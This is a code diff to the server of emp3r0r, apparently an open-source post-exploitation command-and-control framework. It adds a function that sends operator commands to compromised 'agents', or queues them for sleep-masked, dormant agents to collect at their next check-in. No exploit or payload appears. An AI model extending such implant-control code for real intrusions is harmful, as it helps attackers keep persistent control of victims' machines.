@@ -1,9 +1,12 @@
 package server
 
 import (
+	"fmt"
 	"sync"
+	"time"
 
 	"github.com/fxamacker/cbor/v2"
+	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
@@ -41,6 +44,30 @@ func enqueueAgentCommand(agentUUID string, msg def.MsgTunData) {
 	depth := len(q.cmds)
 	q.mu.Unlock()
 	logging.Infof("Queued command %s for agent %s (queue depth %d)", msg.JobID, util.AgentRef(agentUUID), depth)
+}
+
+// sendAgentCommandOrQueue delivers cmd over the agent's message tunnel, or
+// queues it for the agent's next check-in when no tunnel is live — a
+// sleep-masked agent between polls. A dormant agent is not a failure: it is only
+// gone once its offline grace expires, at which point it is no longer listed.
+func sendAgentCommandOrQueue(cmd, jobID string, agent *def.Emp3r0rAgent) error {
+	if agent == nil {
+		return fmt.Errorf("no target agent")
+	}
+	if err := agents.SendCmd(cmd, jobID, agent); err == nil {
+		return nil
+	}
+	if agent.UUID == "" {
+		return fmt.Errorf("agent %s has no UUID", agent.Tag)
+	}
+	enqueueAgentCommand(agent.UUID, def.MsgTunData{
+		JobID:    jobID,
+		CmdSlice: util.ParseCmd(cmd),
+		Tag:      agent.Tag,
+		Time:     time.Now().UnixMilli(),
+	})
+	logging.Debugf("Agent %s is dormant; queued %q for its next check-in", agent.Tag, cmd)
+	return nil
 }
 
 // hasQueuedCommands reports whether an agent has at least one pending command.
